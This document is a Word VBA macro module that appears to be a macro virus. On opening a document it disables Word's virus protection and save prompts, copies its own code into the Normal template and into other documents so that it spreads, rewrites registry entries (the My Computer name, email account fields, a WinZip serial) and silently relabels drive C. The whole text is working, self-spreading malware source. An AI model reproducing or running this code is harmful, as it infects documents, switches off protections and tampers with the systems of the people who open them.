   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Open()
   On Error Resume Next

   bSavedState = ActiveDocument.Saved
       Set prevDocument = NormalTemplate
       Set nextDocument = newDocument
   Options.VirusProtection = Not True
   Options.SaveNormalPrompt = Not True
   Options.ConfirmConversions = Not True

   sLines = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)

   If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString sLines
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Private Sub Document_Close()"

   System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "MY Computer"
   System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon", "") = "C:\\WINDOWS\\SYSTEM\\shell32.dll,15"
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000008", "SMTP Display Name") = ""
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000008", "SMTP Email Address") = ""
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Nico Mak Computing\WinZip\WinIni", "Name") = ""
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Nico Mak Computing\WinZip\WinIni", "SN") = "415F7097"
   System.PrivateProfileString("win.ini", "WinZip", "Name") = ""
   System.PrivateProfileString("win.ini", "WinZip", "Name") = ""
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Applets\Hearts", "name") = ""

   Shell "label c: n0nuts", vbHide

   ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Open()" Then
   ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString sLines
   ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Private Sub Document_Open()"
   If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   End If

   ActiveDocument.Saved = bSavedState


       With nextDocument.VBProject.VBComponents
           For i = 1 To .Count
               If .Item(i).Type = 100 Then
                   With .Item(i).CodeModule
                       If Not .Find("Sub " + nextRoutine + "()", 1, 1, .CountOfLines, 10) Then
                           With prevDocument.VBProject.VBComponents.Item(1).CodeModule
                               codeString = .Lines(.ProcStartLine(nextRoutine, vbext_pk_Proc), .ProcCountLines(nextRoutine, vbext_pk_Proc))
                           End With
                       End If
                       .AddFromString codeString
                       .ReplaceLine 1, "Private Sub " + nextRoutine + "()"
                       If prevDocument Is NormalTemplate Then
                           .ReplaceLine 5, "    Set prevDocument = ActiveDocument"
                           .ReplaceLine 6, "    Set nextDocument = NormalTemplate"
                       Else
                           .ReplaceLine 5, "    Set prevDocument = NormalTemplate"
                           .ReplaceLine 6, "    Set nextDocument = newDocument"
                       End If
                   End With
               End If
           Next
       End With
   End Sub
